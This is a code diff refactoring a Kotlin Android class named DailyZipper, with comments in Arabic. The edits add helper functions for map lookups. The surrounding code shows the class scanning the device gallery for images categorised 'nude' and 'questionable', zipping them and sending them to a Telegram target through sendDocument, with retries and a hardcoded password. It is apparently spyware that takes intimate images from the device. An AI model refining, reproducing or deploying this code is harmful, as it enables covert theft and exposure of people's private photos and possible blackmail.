@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * تم إزالة كافة استخدامات الأقواس المربعة و safeGet واستبدالها بفحص نوع مباشر باستخدام entries.
+ * تم إزالة كافة استخدامات الأقواس المربعة واستخدام فحص النوع مع entries.
  */
 class DailyZipper(
     context: Context,
@@ -92,6 +92,25 @@ class DailyZipper(
         config.put("password", "ShieldCore2024!")
         config.put("max_batches", 10)
         loadConfig()
+    }
+
+    // ========== دوال مساعدة داخلية للوصول الآمن (بدون [] أو get) ==========
+    private fun extractMapEntry(map: Any?, key: String): Any? {
+        return if (map is Map<*, *>) {
+            map.entries.firstOrNull { it.key?.toString() == key }?.value
+        } else null
+    }
+
+    private fun extractBoolean(map: Any?, key: String, default: Boolean = false): Boolean {
+        val value = extractMapEntry(map, key)
+        return when (value) {
+            true, "true", 1, "1" -> true
+            else -> default
+        }
+    }
+
+    private fun extractString(map: Any?, key: String, default: String = ""): String {
+        return extractMapEntry(map, key)?.toString() ?: default
     }
 
     @Suppress("UNCHECKED_CAST")
@@ -262,7 +281,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (بدون دوال safeGet)
+    //  إرسال الملفات مع إعادة المحاولة (باستخدام دوال مساعدة داخلية)
     // ============================================================
 
     private suspend fun safeSend(
@@ -295,17 +314,8 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ التحقق المباشر باستخدام entries بدون دوال مساعدة
-                val isOk = if (result is Map<*, *>) {
-                    val okEntry = result.entries.firstOrNull { it.key?.toString() == "ok" }
-                    val okValue = okEntry?.value
-                    when (okValue) {
-                        true, "true", 1, "1" -> true
-                        else -> false
-                    }
-                } else {
-                    false
-                }
+                // ✅ استخدام الدالة المساعدة الداخلية
+                val isOk = extractBoolean(result, "ok", false)
                 if (isOk) {
                     return true
                 }
@@ -617,7 +627,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (بدون دوال safeGet)
+    //  التشغيل التلقائي (باستخدام دوال مساعدة داخلية)
     // ============================================================
 
     fun run(): Boolean {
@@ -638,13 +648,8 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخراج المسار مباشرة بدون دوال مساعدة
-                            val path = if (item is Map<*, *>) {
-                                val pathEntry = item.entries.firstOrNull { it.key?.toString() == "path" }
-                                pathEntry?.value?.toString() ?: ""
-                            } else {
-                                ""
-                            }
+                            // ✅ استخراج المسار باستخدام الدالة المساعدة
+                            val path = extractString(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
